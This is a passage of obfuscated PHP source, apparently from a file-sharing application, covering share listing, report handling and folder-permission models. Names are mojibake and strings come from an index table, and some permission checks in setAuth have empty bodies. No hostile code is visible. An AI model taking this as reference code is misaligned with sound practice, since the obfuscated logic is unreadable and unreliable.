array($½Ê½íğ»[2187] => array($½Ê½íğ»[504], $±ô¢¡)); $this->where($ÔŸüğ©)->delete(); Model($½Ê½íğ»[682])->where($ÔŸüğ©)->delete(); } public function listAll($ëµÜ›Ñ£) { $Ä˜òÏğ½ =& $_SERVER[åÄ¼Ùßš]; $úªâíÖÁ = array(); if ($ëµÜ›Ñ£[$Ä˜òÏğ½[1817]]) { $úªâíÖÁ[$Ä˜òÏğ½[1817]] = $ëµÜ›Ñ£[$Ä˜òÏğ½[1817]]; } if ($ëµÜ›Ñ£[$Ä˜òÏğ½[854]]) { $µÎİÁÏ³ = $ëµÜ›Ñ£[$Ä˜òÏğ½[855]] ? $ëµÜ›Ñ£[$Ä˜òÏğ½[855]] : strtotime(date($Ä˜òÏğ½[2198])); $úªâíÖÁ[$Ä˜òÏğ½[234]] = array($Ä˜òÏğ½[410], array($ëµÜ›Ñ£[$Ä˜òÏğ½[854]], $µÎİÁÏ³)); } if ($ëµÜ›Ñ£[$Ä˜òÏğ½[33]]) { $úªâíÖÁ[$ëµÜ›Ñ£[$Ä˜òÏğ½[33]]] = 1; } else { $úªâíÖÁ[] = array($Ä˜òÏğ½[575] => array($Ä˜òÏğ½[1120], 0), $Ä˜òÏğ½[679] => array($Ä˜òÏğ½[1120], 0), $Ä˜òÏğ½[2169] => $Ä˜òÏğ½[2119]); } if ($ëµÜ›Ñ£[$Ä˜òÏğ½[2115]]) { $úªâíÖÁ[] = array($Ä˜òÏğ½[2166] => $ëµÜ›Ñ£[$Ä˜òÏğ½[2115]], $Ä˜òÏğ½[1704] => array($Ä˜òÏğ½[471], "\45{$ëµÜ›Ñ£[$Ä˜òÏğ½[2115]]}\45"), $Ä˜òÏğ½[2169] => $Ä˜òÏğ½[2119]); } $™Á‰‰—Æ = $this->_makeOrder()->where($úªâíÖÁ)->selectPage(20); if (empty($™Á‰‰—Æ[$Ä˜òÏğ½[447]])) { return array(); } $this->_listDataApply($™Á‰‰—Æ[$Ä˜òÏğ½[447]]); return $™Á‰‰—Æ; } public function listDataApply($“„ú™ô¦) { $this->_listDataApply($“„ú™ô¦); return $“„ú™ô¦; } private function _listDataApply(&$ÇŠĞúüŸ) { $×ÖÜƒŠ =& $_SERVER[åÄ¼Ùßš]; $¢‹Ì¼É¸ = array_to_keyvalue($ÇŠĞúüŸ, $×ÖÜƒŠ[12], $×ÖÜƒŠ[1817]); $Â‹”³×´ = Model($×ÖÜƒŠ[610])->userListInfo(array_unique($¢‹Ì¼É¸)); $’ÜŸÅü = array_to_keyvalue($ÇŠĞúüŸ, $×ÖÜƒŠ[12], $×ÖÜƒŠ[194]); $÷¨¬ô³ñ = Model($×ÖÜƒŠ[926])->sourceListInfo($’ÜŸÅü, !0); foreach ($ÇŠĞúüŸ as $Áùâ²éÃ => &$úÚº¡¤) { $«‚°İ·î = $úÚº¡¤[$×ÖÜƒŠ[1817]]; $úÚº¡¤[$×ÖÜƒŠ[2199]] = $Â‹”³×´[$«‚°İ·î] ? $Â‹”³×´[$«‚°İ·î] : !1; if (!$úÚº¡¤[$×ÖÜƒŠ[2199]] || $úÚº¡¤[$×ÖÜƒŠ[2199]][$×ÖÜƒŠ[843]] != $×ÖÜƒŠ[91]) { unset($ÇŠĞúüŸ[$Áùâ²éÃ]); continue; } $ƒœØ£±§ = $úÚº¡¤[$×ÖÜƒŠ[194]]; $úÚº¡¤[$×ÖÜƒŠ[90]] = $÷¨¬ô³ñ[$ƒœØ£±§] ? $÷¨¬ô³ñ[$ƒœØ£±§] : !1; if ($úÚº¡¤[$×ÖÜƒŠ[90]][$×ÖÜƒŠ[517]] == $×ÖÜƒŠ[91]) { unset($ÇŠĞúüŸ[$Áùâ²éÃ]); } if ($úÚº¡¤[$×ÖÜƒŠ[90]] != $×ÖÜƒŠ[231] && !$úÚº¡¤[$×ÖÜƒŠ[90]]) { unset($ÇŠĞúüŸ[$Áùâ²éÃ]); } } unset($úÚº¡¤); $ÇŠĞúüŸ = array_values($ÇŠĞúüŸ); } private function _makeOrder($ì–Œ’öå = '') { $ñö©ø‡ä =& $_SERVER[åÄ¼Ùßš]; $áñÎõ‡Å = array($ñö©ø‡ä[234], $ñö©ø‡ä[855], $ñö©ø‡ä[2183], $ñö©ø‡ä[2184]); $ÃîŞ¯ÓÕ = array($ñö©ø‡ä[534] => $ñö©ø‡ä[535], $ñö©ø‡ä[536] => $ñö©ø‡ä[537]); $¾Ö¥šï« = Input::get($ñö©ø‡ä[541], $ñö©ø‡ä[7], $ñö©ø‡ä[509], $áñÎõ‡Å); $ìú“çşæ = Input::get($ñö©ø‡ä[542], $ñö©ø‡ä[7], $ñö©ø‡ä[2200], array($ñö©ø‡ä[2112], $ñö©ø‡ä[536])); $ìú“çşæ = $ÃîŞ¯ÓÕ[$ìú“çşæ]; $ì–Œ’öå = $ì–Œ’öå . "{$¾Ö¥šï«}\x20{$ìú“çşæ}"; return $this->order($ì–Œ’öå); } public function reportAdd($µù‚ÍÁÎ) { $·‹’øœ¸ =& $_SERVER[åÄ¼Ùßš]; $Î¤•ëˆ = array($·‹’øœ¸[681] => $µù‚ÍÁÎ[$·‹’øœ¸[681]], $·‹’øœ¸[1817] => USER_ID); if (Model($·‹’øœ¸[2196])->where($Î¤•ëˆ)->find()) { return !1; } $‹ãæœ›¤ = array($·‹’øœ¸[681] => $µù‚ÍÁÎ[$·‹’øœ¸[681]], $·‹’øœ¸[1704] => $µù‚ÍÁÎ[$·‹’øœ¸[1704]], $·‹’øœ¸[194] => $µù‚ÍÁÎ[$·‹’øœ¸[194]], $·‹’øœ¸[554] => $µù‚ÍÁÎ[$·‹’øœ¸[554]], $·‹’øœ¸[1817] => USER_ID, $·‹’øœ¸[33] => $µù‚ÍÁÎ[$·‹’øœ¸[33]], $·‹’øœ¸[537] => $µù‚ÍÁÎ[$·‹’øœ¸[537]]); return Model($·‹’øœ¸[2196])->add($‹ãæœ›¤); } public function reportList($ŒÕ­ƒØ) { $ÒÒÏÚâÅ =& $_SERVER[åÄ¼Ùßš]; $’‘°œŞ¦ = array(); if ($ŒÕ­ƒØ[$ÒÒÏÚâÅ[854]]) { $”ØŞ¤Ë» = $ŒÕ­ƒØ[$ÒÒÏÚâÅ[855]] ? $ŒÕ­ƒØ[$ÒÒÏÚâÅ[855]] : strtotime(date($ÒÒÏÚâÅ[2198])); $’‘°œŞ¦[$ÒÒÏÚâÅ[234]] = array($ÒÒÏÚâÅ[410], array($ŒÕ­ƒØ[$ÒÒÏÚâÅ[854]], $”ØŞ¤Ë»)); } if (isset($ŒÕ­ƒØ[$ÒÒÏÚâÅ[33]]) && in_array($ŒÕ­ƒØ[$ÒÒÏÚâÅ[33]], array($ÒÒÏÚâÅ[91], $ÒÒÏÚâÅ[521], $ÒÒÏÚâÅ[2201], $ÒÒÏÚâÅ[2202], $ÒÒÏÚâÅ[2203]))) { $’‘°œŞ¦[$ÒÒÏÚâÅ[33]] = $ŒÕ­ƒØ[$ÒÒÏÚâÅ[33]]; } if (isset($ŒÕ­ƒØ[$ÒÒÏÚâÅ[843]]) && in_array($ŒÕ­ƒØ[$ÒÒÏÚâÅ[843]], array($ÒÒÏÚâÅ[231], $ÒÒÏÚâÅ[91], $ÒÒÏÚâÅ[521], $ÒÒÏÚâÅ[2201]))) { $’‘°œŞ¦[$ÒÒÏÚâÅ[843]] = $ŒÕ­ƒØ[$ÒÒÏÚâÅ[843]]; } $ØÇó…ı = Input::get($ÒÒÏÚâÅ[542], $ÒÒÏÚâÅ[7], $ÒÒÏÚâÅ[2200], array($ÒÒÏÚâÅ[2112], $ÒÒÏÚâÅ[536])); $—¼§î’¬ = array($ÒÒÏÚâÅ[534] => $ÒÒÏÚâÅ[535], $ÒÒÏÚâÅ[536] => $ÒÒÏÚâÅ[537]); $ÎÏİ‹ëÕ = $ÒÒÏÚâÅ[2204] . $—¼§î’¬[$ØÇó…ı]; $¹²á»Šˆ = Model($ÒÒÏÚâÅ[2196])->where($’‘°œŞ¦)->order($ÎÏİ‹ëÕ)->selectPage(20); if (empty($¹²á»Šˆ[$ÒÒÏÚâÅ[447]])) { return array(); } $®­ÀÈ˜¾ = array_to_keyvalue_group($¹²á»Šˆ[$ÒÒÏÚâÅ[447]], $ÒÒÏÚâÅ[843], $ÒÒÏÚâÅ[681]); if (!empty($®­ÀÈ˜¾[0])) { $ŒÕ­ƒØ = $®­ÀÈ˜¾[0]; $’‘°œŞ¦ = array($ÒÒÏÚâÅ[681] => array($ÒÒÏÚâÅ[7], $ŒÕ­ƒØ)); $¸’¦¦Ë­ = $this->where($’‘°œŞ¦)->field($ÒÒÏÚâÅ[681])->select(); $¸’¦¦Ë­ = array_to_keyvalue($¸’¦¦Ë­, $ÒÒÏÚâÅ[12], $ÒÒÏÚâÅ[681]); $†Ş‡õÚÇ = array_diff($ŒÕ­ƒØ, $¸’¦¦Ë­); if (!empty($†Ş‡õÚÇ)) { foreach ($¹²á»Šˆ[$ÒÒÏÚâÅ[447]] as $Ï«ÜÆöÄ => $§ŞÆ™â) { if (in_array($§ŞÆ™â[$ÒÒÏÚâÅ[681]], $†Ş‡õÚÇ)) { unset($¹²á»Šˆ[$ÒÒÏÚâÅ[447]][$Ï«ÜÆöÄ]); } } } } $this->_listDataApply($¹²á»Šˆ[$ÒÒÏÚâÅ[447]]); return $¹²á»Šˆ; } public function reportStatus($…ÆËÏğö) { $µÚ¨Ù¡è =& $_SERVER[åÄ¼Ùßš]; $†µƒ¼ó = array($µÚ¨Ù¡è[484] => $…ÆËÏğö[$µÚ¨Ù¡è[484]]); $ù ‰ù‡Á = Model($µÚ¨Ù¡è[2196])->where($†µƒ¼ó)->field($µÚ¨Ù¡è[2205])->find(); if (!$ù ‰ù‡Á) { return !1; } $ï¯‹Ø ‹ = array($µÚ¨Ù¡è[843] => $…ÆËÏğö[$µÚ¨Ù¡è[843]]); if ($…ÆËÏğö[$µÚ¨Ù¡è[843]] == $µÚ¨Ù¡è[2201] && $ù ‰ù‡Á[$µÚ¨Ù¡è[843]] == $µÚ¨Ù¡è[2201]) { $ï¯‹Ø ‹[$µÚ¨Ù¡è[843]] = 0; } $Õ¤’ò÷ = Model($µÚ¨Ù¡è[2196])->where($†µƒ¼ó)->save($ï¯‹Ø ‹); if ($…ÆËÏğö[$µÚ¨Ù¡è[843]] == $µÚ¨Ù¡è[521]) { if ($ù ‰ù‡Á[$µÚ¨Ù¡è[554]] != $µÚ¨Ù¡è[231] && $this->shareFileMeta($ù ‰ù‡Á[$µÚ¨Ù¡è[554]])) { $this->shareFileMeta($ù ‰ù‡Á[$µÚ¨Ù¡è[554]], 0); } $this->remove($ù ‰ù‡Á[$µÚ¨Ù¡è[681]]); return !0; } if ($Õ¤’ò÷ && $…ÆËÏğö[$µÚ¨Ù¡è[843]] == $µÚ¨Ù¡è[2201]) { $Êµ¥í±Ã = $ï¯‹Ø ‹[$µÚ¨Ù¡è[843]] == $µÚ¨Ù¡è[2201] ? 1 : 0; $this->shareFileMeta($ù ‰ù‡Á[$µÚ¨Ù¡è[554]], $Êµ¥í±Ã); $this->removeByFile($ù ‰ù‡Á[$µÚ¨Ù¡è[554]]); } return $Õ¤’ò÷; } private function removeByFile($Òğ•ÌüÙ) { $Ï§‹äˆ =& $_SERVER[åÄ¼Ùßš]; $»–³åˆˆ = Model($Ï§‹äˆ[926])->where(array($Ï§‹äˆ[554] => $Òğ•ÌüÙ))->field($Ï§‹äˆ[194])->select(); $”Ö­ƒæÏ = array_to_keyvalue($»–³åˆˆ, $Ï§‹äˆ[12], $Ï§‹äˆ[194]); $öÊ™€Œ = array($Ï§‹äˆ[194] => array($Ï§‹äˆ[7], $”Ö­ƒæÏ), $Ï§‹äˆ[575] => 1); $»–³åˆˆ = $this->where($öÊ™€Œ)->field($Ï§‹äˆ[681])->select(); if (empty($»–³åˆˆ)) { return; } $íÈ­·ú = array_to_keyvalue($»–³åˆˆ, $Ï§‹äˆ[12], $Ï§‹äˆ[681]); $this->remove($íÈ­·ú); } private function shareFileMeta($®áÏ¥áî, $å¢¬øå = null) { $‹ËÍŸ†ï =& $_SERVER[åÄ¼Ùßš]; $¦€×ã¶Ş = array($‹ËÍŸ†ï[554] => $®áÏ¥áî, $‹ËÍŸ†ï[97] => $‹ËÍŸ†ï[2206]); if (is_null($å¢¬øå)) { return Model($‹ËÍŸ†ï[2207])->where($¦€×ã¶Ş)->find(); } $¦€×ã¶Ş[$‹ËÍŸ†ï[452]] = $å¢¬øå; Model($‹ËÍŸ†ï[2207])->add($¦€×ã¶Ş, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\162\143\145\137\141\x75\x74\x68"; public function getAuth($ŸÃ¶Œ×ß) { $Ü¡»¸–‰ =& $_SERVER[åÄ¼Ùßš]; $‹ø¿ü = $this->sourceAuthSelect($ŸÃ¶Œ×ß); $Ó«ÒŠİû = array(); $¡×µ®’Ş = array(); $·µŞİ‚¾ = 2 << 25; foreach ($‹ø¿ü as $ÇÇ­©² ) { $‚¶„Ç = Model($Ü¡»¸–‰[584])->listData($ÇÇ­©² [$Ü¡»¸–‰[2125]]); if (!$‚¶„Ç) { continue; } $Ó«ÒŠİû[] = $ÇÇ­©² ; $ã…ÍŞÊÏ = 0; if ($ÇÇ­©² [$Ü¡»¸–‰[191]] == SourceModel::TYPE_GROUP) { $ã…ÍŞÊÏ = $·µŞİ‚¾ * 2; } if ($ÇÇ­©² [$Ü¡»¸–‰[191]] == SourceModel::TYPE_USER) { $ã…ÍŞÊÏ = $·µŞİ‚¾; } if ($ÇÇ­©² [$Ü¡»¸–‰[191]] == SourceModel::TYPE_USER && $ÇÇ­©² [$Ü¡»¸–‰[582]] == $Ü¡»¸–‰[231]) { $ã…ÍŞÊÏ = 0; } $¡×µ®’Ş[] = $‚¶„Ç[$Ü¡»¸–‰[499]] + $ã…ÍŞÊÏ; } array_multisort($¡×µ®’Ş, SORT_DESC, $Ó«ÒŠİû); return $Ó«ÒŠİû; } public function sourceAuthSelect($±ÌÉøŸµ) { $ıã·¥Ñù =& $_SERVER[åÄ¼Ùßš]; static $·çî¢”ó = array(); $×ûÂÍşÚ = is_array($±ÌÉøŸµ) ? !1 : !0; if ($×ûÂÍşÚ) { $±ÌÉøŸµ = array($±ÌÉøŸµ); } $¿½€›º = array(); foreach ($±ÌÉøŸµ as $²‡ü™ûÜ) { if (isset($·çî¢”ó[$²‡ü™ûÜ])) { $¿½€›º[$²‡ü™ûÜ] = $·çî¢”ó[$²‡ü™ûÜ]; } } if (count($¿½€›º) == count($±ÌÉøŸµ)) { return $×ûÂÍşÚ ? $¿½€›º[$±ÌÉøŸµ[0]] : $¿½€›º; } $ÒİæàÕ» = $ıã·¥Ñù[2208]; $¾©âñ¤ = array($ıã·¥Ñù[194] => array($ıã·¥Ñù[7], $±ÌÉøŸµ)); $¤À¢Ù°Ì = $this->field($ÒİæàÕ»)->order($ıã·¥Ñù[484])->where($¾©âñ¤)->select(); $şï¦ÖÖ = array_to_keyvalue_group($¤À¢Ù°Ì, $ıã·¥Ñù[194]); foreach ($±ÌÉøŸµ as $²‡ü™ûÜ) { $·çî¢”ó[$²‡ü™ûÜ] = $şï¦ÖÖ[$²‡ü™ûÜ] ? $şï¦ÖÖ[$²‡ü™ûÜ] : array(); } if ($×ûÂÍşÚ) { return $¤À¢Ù°Ì; } return $şï¦ÖÖ; } public function setAuth($¡§‰æá, $ñüÊŠ¿º) { $ßÑÃ£îè =& $_SERVER[åÄ¼Ùßš]; $¨¾€ÅßÔ = Model($ßÑÃ£îè[1466])->sourceInfo($¡§‰æá); if (!$¨¾€ÅßÔ) { return !1; } if ($¨¾€ÅßÔ[$ßÑÃ£îè[191]] != SourceModel::TYPE_GROUP) { return !1; } $À„ıŠãä = 1; $Óş·Âåä = $¨¾€ÅßÔ[$ßÑÃ£îè[582]]; if ($Óş·Âåä != $À„ıŠãä) { $í‹¼îÒ¢ = array($ßÑÃ£îè[1428] => $Óş·Âåä); $ ç‰Êõ× = Model($ßÑÃ£îè[2111])->field($ßÑÃ£îè[1817])->where($í‹¼îÒ¢)->select(); $ ç‰Êõ× = array_to_keyvalue($ ç‰Êõ×, $ßÑÃ£îè[12], $ßÑÃ£îè[1817]); } $­„¨©× = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $«€™€’ = array(); foreach ($ñüÊŠ¿º as $½ô´¸Ôø) { if (!in_array($½ô´¸Ôø[$ßÑÃ£îè[191]], $­„¨©×)) { show_json(LNG($ßÑÃ£îè[2209]), !1); } if ($Óş·Âåä != $À„ıŠãä) { if ($½ô´¸Ôø[$ßÑÃ£îè[191]] == SourceModel::TYPE_GROUP) { } if ($½ô´¸Ôø[$ßÑÃ£îè[582]] != 0 && !in_array($½ô´¸Ôø[$ßÑÃ£îè[582]], $ ç‰Êõ×)) { } } if ($½ô´¸Ôø[$ßÑÃ£îè[582]] == 0) { $½ô´¸Ôø[$ßÑÃ£îè[191]] = SourceModel::TYPE_USER; } $«€™€’[] = array($ßÑÃ£îè[194] => $¡§‰æá, $ßÑÃ£îè[191] => intval($½ô´¸Ôø[$ßÑÃ£îè[191]]), $ßÑÃ£îè[582] => intval($½ô´¸Ôø[$ßÑÃ£îè[582]]), $ßÑÃ£îè[2125] => intval($½ô´¸Ôø[$ßÑÃ£îè[2125]]) ? intval($½ô´¸Ôø[$ßÑÃ£îè[2125]]) : 0, $ßÑÃ£îè[2188] => intval($½ô´¸Ôø[$ßÑÃ£îè[2188]]) ? intval($½ô´¸Ôø[$ßÑÃ£îè[2188]]) : -1); } $this->where(array($ßÑÃ£îè[503] => $¡§‰æá))->delete(); $this->addAll($«€™€’); return !0; } public function authClear($Çáİíá€) { $ç£Ñùâ =& $_SERVER[åÄ¼Ùßš]; $¿“¹šàì = Model($ç£Ñùâ[1466])->sourceInfo($Çáİíá€); $ü© ¯¾ë = array($Çáİíá€); if ($¿“¹šàì[$ç£Ñùâ[497]] == $ç£Ñùâ[91]) { $Ä¦ÌÀŞæ = array($ç£Ñùâ[668] => array($ç£Ñùâ[628], $¿“¹šàì[$ç£Ñùâ[597]] . $Çáİíá€ . $ç£Ñùâ[629])); $ü© ¯¾ë = Model($ç£Ñùâ[1466])->field($ç£Ñùâ[503])->where($Ä¦ÌÀŞæ)->getField($ç£Ñùâ[194], !0); $ü© ¯¾ë[] = $Çáİíá€; } $this->where(array($ç£Ñùâ[503] => array($ç£Ñùâ[504], $ü© ¯¾ë)))->delete(); return !0; } public function getAllParent($½è—Ã) { $‹ÕòÔ¾É =& $_SERVER[åÄ¼Ùßš]; $ùÛÁ¡‡³ = Model($‹ÕòÔ¾É[1466])->sourceInfo($½è—Ã); if (!$ùÛÁ¡‡³ || $ùÛÁ¡‡³[$‹ÕòÔ¾É[191]] != SourceModel::TYPE_GROUP) { return array(); } $‘‘ ‡Àò = Model($‹ÕòÔ¾É[1466])->parentLevelArray($ùÛÁ¡‡³[$‹ÕòÔ¾É[597]]); $Û³ğ˜óÄ = array_merge(array(intval($½è—Ã)), array_reverse($‘‘ ‡Àò)); $¢¬ë£—µ = $this->sourceAuthSelect($Û³ğ˜óÄ); $¦ıãú­ß = $GLOBALS[$‹ÕòÔ¾É[6]][$‹ÕòÔ¾É[92]][$‹ÕòÔ¾É[2124]] == 1; $Ê¾ƒéİ = $¦ıãú­ß ? 3 : 2; $ÃôæÈÆ• = Model($‹ÕòÔ¾É[1426])->getInfo($ùÛÁ¡‡³[$‹ÕòÔ¾É[582]]); $®±²¸ÛŞ = explode($‹ÕòÔ¾É[50], trim($ÃôæÈÆ•[$‹ÕòÔ¾É[597]], $‹ÕòÔ¾É[50])); $½îÀó¿… = array_merge(array($ÃôæÈÆ•[$‹ÕòÔ¾É[1428]]), array_reverse(array_slice($®±²¸ÛŞ, $Ê¾ƒéİ))); foreach ($¢¬ë£—µ as $½è—Ã => $±³Ë·Ø¿) { foreach ($±³Ë·Ø¿ as $çÑõÏÙ§) { if (!$çÑõÏÙ§ || !$çÑõÏÙ§[$‹ÕòÔ¾É[582]] || $çÑõÏÙ§[$‹ÕòÔ¾É[582]] == $‹ÕòÔ¾É[231]) { continue; } if ($çÑõÏÙ§[$‹ÕòÔ¾É[191]] != SourceModel::TYPE_GROUP) { continue; } $½îÀó¿…[] = $çÑõÏÙ§[$‹ÕòÔ¾É[582]]; } } $½îÀó¿… = array_unique($½îÀó¿…); $Ëá˜ñôí = array($‹ÕòÔ¾É[430] => _get($GLOBALS[$‹ÕòÔ¾É[7]], $‹ÕòÔ¾É[430], 1), $‹ÕòÔ¾É[441] => _get($GLOBALS[$‹ÕòÔ¾É[7]], $‹ÕòÔ¾É[441], 500)); $GLOBALS[$‹ÕòÔ¾É[7]][$‹ÕòÔ¾É[430]] = 1; $GLOBALS[$‹ÕòÔ¾É[7]][$‹ÕòÔ¾É[441]] = 500; $…è€’Ïº = array($‹ÕòÔ¾É[505] => 0, $‹ÕòÔ¾É[2023] => AuthModel::authAll(), $‹ÕòÔ¾É[506] => LNG($‹ÕòÔ¾É[2210]), $‹ÕòÔ¾É[2040] => $‹ÕòÔ¾É[2211]); $ß‰¡ş´Ú = array(); $¾ú˜’Ü… = explode($‹ÕòÔ¾É[50], $‹ÕòÔ¾É[2212]); $ºìûöãÀ = explode($‹ÕòÔ¾É[50], $‹ÕòÔ¾É[2213]); foreach ($½îÀó¿… as $æ£ÃĞöÂ) { $€Üö‹ÀÛ = Model($‹ÕòÔ¾É[1426])->getInfo($æ£ÃĞöÂ); $óÉ–ûöÏ = array_field_key($€Üö‹ÀÛ, $¾ú˜’Ü…); $Ü—ü˜¯ = Model($‹ÕòÔ¾É[610])->listByGroup($æ£ÃĞöÂ); foreach ($Ü—ü˜¯[$‹ÕòÔ¾É[447]] as $—“ıİ¤œ => $ĞÖìÛ¿) { $this->userGroupList($ĞÖìÛ¿[$‹ÕòÔ¾É[1817]], $ĞÖìÛ¿); $¼ğ®“£Ê = $ĞÖìÛ¿[$‹ÕòÔ¾É[1817]] . $‹ÕòÔ¾É[12]; if (isset($ß‰¡ş´Ú[$¼ğ®“£Ê])) { continue; } $–§¬¥‹ï = Model($‹ÕòÔ¾É[2214])->listData($ĞÖìÛ¿[$‹ÕòÔ¾É[2215]]); $ĞÖìÛ¿[$‹ÕòÔ¾É[2216]] = Action($‹ÕòÔ¾É[2217])->parseUrl($ĞÖìÛ¿[$‹ÕòÔ¾É[2216]]); $ĞÖìÛ¿[$‹ÕòÔ¾É[1781]] = $–§¬¥‹ï && $–§¬¥‹ï[$‹ÕòÔ¾É[2218]] == 1; $‰ì…şœ = $this->groupRootAuth($æ£ÃĞöÂ, $ĞÖìÛ¿[$‹ÕòÔ¾É[1817]]); $‰ì…şœ = $ĞÖìÛ¿[$‹ÕòÔ¾É[1781]] ? $…è€’Ïº : $‰ì…şœ; $ß‰¡ş´Ú[$¼ğ®“£Ê] = array($‹ÕòÔ¾É[2219] => $‹ÕòÔ¾É[2220], $‹ÕòÔ¾É[2221] => LNG($‹ÕòÔ¾É[2222]), $‹ÕòÔ¾É[2199] => array_field_key($ĞÖìÛ¿, $ºìûöãÀ), $‹ÕòÔ¾É[499] => $‰ì…şœ, $‹ÕòÔ¾É[500] => $‰ì…şœ[$‹ÕòÔ¾É[499]], $‹ÕòÔ¾É[2223] => $óÉ–ûöÏ); } } $GLOBALS[$‹ÕòÔ¾É[7]][$‹ÕòÔ¾É[430]] = $Ëá˜ñôí[$‹ÕòÔ¾É[430]]; $GLOBALS[$‹ÕòÔ¾É[7]][$‹ÕòÔ¾É[441]] = $Ëá˜ñôí[$‹ÕòÔ¾É[441]]; foreach ($¢¬ë£—µ as $½è—Ã => $±³Ë·Ø¿) { if (!$±³Ë·Ø¿) { continue; } foreach ($±³Ë·Ø¿ as $çÑõÏÙ§) { if (!$çÑõÏÙ§ || !$çÑõÏÙ§[$‹ÕòÔ¾É[582]] || $çÑõÏÙ§[$‹ÕòÔ¾É[582]] == $‹ÕòÔ¾É[231]) { continue; } if ($çÑõÏÙ§[$‹ÕòÔ¾É[191]] != SourceModel::TYPE_USER) { continue; } $¼ğ®“£Ê = $çÑõÏÙ§[$‹ÕòÔ¾É[582]] . $‹ÕòÔ¾É[12]; if (isset($ß‰¡ş´Ú[$¼ğ®“£Ê])) { continue; } $ÊšÍ¶Å = $this->authMake($±³Ë·Ø¿, $¼ğ®“£Ê); if (!$ÊšÍ¶Å || !$ÊšÍ¶Å[$‹ÕòÔ¾É[2221]]) { continue; } $ß‰¡ş´Ú[$¼ğ®“£Ê] = array($‹ÕòÔ¾É[2219] => $‹ÕòÔ¾É[2224], $‹ÕòÔ¾É[2221] => $ÊšÍ¶Å[$‹ÕòÔ¾É[2221]], $‹ÕòÔ¾É[2199] => Model($‹ÕòÔ¾É[610])->getInfoSimpleOuter($¼ğ®“£Ê), $‹ÕòÔ¾É[499] => $ÊšÍ¶Å[$‹ÕòÔ¾É[553]], $‹ÕòÔ¾É[500] => $ÊšÍ¶Å[$‹ÕòÔ¾É[553]][$‹ÕòÔ¾É[499]], $‹ÕòÔ¾É[2223] => $ÊšÍ¶Å[$‹ÕòÔ¾É[2225]]); } } foreach ($¢¬ë£—µ as $½è—Ã => $±³Ë·Ø¿) { if (!$±³Ë·Ø¿) { continue; } foreach ($ß‰¡ş´Ú as $¼ğ®“£Ê => $­ÀŸ‡Üí) { if ($­ÀŸ‡Üí[$‹ÕòÔ¾É[2199]][$‹ÕòÔ¾É[1781]] || $­ÀŸ‡Üí[$‹ÕòÔ¾É[2219]] == $‹ÕòÔ¾É[2224]) { continue; } $ÊšÍ¶Å = $this->authMake($±³Ë·Ø¿, $¼ğ®“£Ê); if (!$ÊšÍ¶Å || !$ÊšÍ¶Å[$‹ÕòÔ¾É[2221]]) { continue; } $ß‰¡ş´Ú[$¼ğ®“£Ê] = array($‹ÕòÔ¾É[2219] => $‹ÕòÔ¾É[2224], $‹ÕòÔ¾É[2221] => $ÊšÍ¶Å[$‹ÕòÔ¾É[2221]], $‹ÕòÔ¾É[2199] => $­ÀŸ‡Üí[$‹ÕòÔ¾É[2199]], $‹ÕòÔ¾É[499] => $ÊšÍ¶Å[$‹ÕòÔ¾É[553]], $‹ÕòÔ¾É[500] => $ÊšÍ¶Å[$‹ÕòÔ¾É[553]][$‹ÕòÔ¾É[499]], $‹ÕòÔ¾É[2223] => $ÊšÍ¶Å[$‹ÕòÔ¾É[2225]]); } } $ß‰¡ş´Ú = array_sort_by($ß‰¡ş´Ú, $‹ÕòÔ¾É[500], $‹ÕòÔ¾É[537]); return $ß‰¡ş´Ú; } public function getAllChildren($Òª‘§£à) { $Üä”„òÜ =& $_SERVER[åÄ¼Ùßš]; $—¨§Ôª = Model($Üä”„òÜ[1466])->sourceInfo($Òª‘§£à); if ($—¨§Ôª[$Üä”„òÜ[497]] != $Üä”„òÜ[91]) { return $this->sourceListAuth(array($Òª‘§£à)); } if ($—¨§Ôª[$Üä”„òÜ[191]] != SourceModel::TYPE_GROUP) { return array(); } $’ÊÄÛ = 1; $ÃÙÔ¶¦ê = array($Òª‘§£à); if ($—¨§Ôª[$Üä”„òÜ[193]] == $Üä”„òÜ[231] && $—¨§Ôª[$Üä”„òÜ[582]] != $’ÊÄÛ) { $ÃÙÔ¶¦ê = $this->groupChidldAllRootSource($—¨§Ôª[$Üä”„òÜ[582]]); } $ò÷ÔîÖÄ = $this->field($Üä”„òÜ[194])->group($Üä”„òÜ[194])->select(); $ò÷ÔîÖÄ = array_to_keyvalue($ò÷ÔîÖÄ, $Üä”„òÜ[12], $Üä”„òÜ[194]); if (!$ò÷ÔîÖÄ) { return array(); } $ƒ›ÔªÙ = $Üä”„òÜ[2226]; $ŠÀ Ş¾ƒ = array($Üä”„òÜ[194] => array($Üä”„òÜ[7], $ò÷ÔîÖÄ), $Üä”„òÜ[517] => $Üä”„òÜ[231]); $§Í¥£›Ì = Model($Üä”„òÜ[926])->field($ƒ›ÔªÙ)->where($ŠÀ Ş¾ƒ)->select(); $ğ•‹–²¤ = array($Òª‘§£à); foreach ($§Í¥£›Ì as $êØÖëÑÏ) { foreach ($ÃÙÔ¶¦ê as $¨¶ÔŞñÅ) { $‡ï½´¯´ = $Üä”„òÜ[50] . $¨¶ÔŞñÅ . $Üä”„òÜ[50]; $™äæÆ¡ê = $êØÖëÑÏ[$Üä”„òÜ[597]] . $êØÖëÑÏ[$Üä”„òÜ[194]] . $Üä”„òÜ[50]; if (strstr($™äæÆ¡ê, $‡ï½´¯´)) { $ğ•‹–²¤[] = $êØÖëÑÏ[$Üä”„òÜ[194]]; break; } } } return $this->sourceListAuth($ğ•‹–²¤); } private function sourceListAuth($Ïæ¢¹ëŞ) { $–É´’Õ² =& $_SERVER[åÄ¼Ùßš]; $ñÖ¿¹®ó = Model($–É´’Õ²[1466])->sourceListInfo($Ïæ¢¹ëŞ, !0); $¿²×Áãæ = $this->sourceAuthSelect($Ïæ¢¹ëŞ); $ùÊß½º… = array(); $ÇâÃŒà = array(); foreach ($ñÖ¿¹®ó as $ëä˜•áº) { unset($ëä˜•áº[$–É´’Õ²[540]]); unset($ëä˜•áº[$–É´’Õ²[538]]); unset($ëä˜•áº[$–É´’Õ²[499]]); unset($ëä˜•áº[$–É´’Õ²[90]]); $ÚÌÏ¬î¹ = $¿²×Áãæ[$ëä˜•áº[$–É´’Õ²[194]]]; if (!$ÚÌÏ¬î¹) { continue; } $ëä˜•áº[$–É´’Õ²[2223]] = $this->authTargetInfo($ÚÌÏ¬î¹); $ëä˜•áº[$–É´’Õ²[595]] = rtrim($ëä˜•áº[$–É´’Õ²[601]], $–É´’Õ²[8]) . $–É´’Õ²[8] . ltrim($ëä˜•áº[$–É´’Õ²[595]], 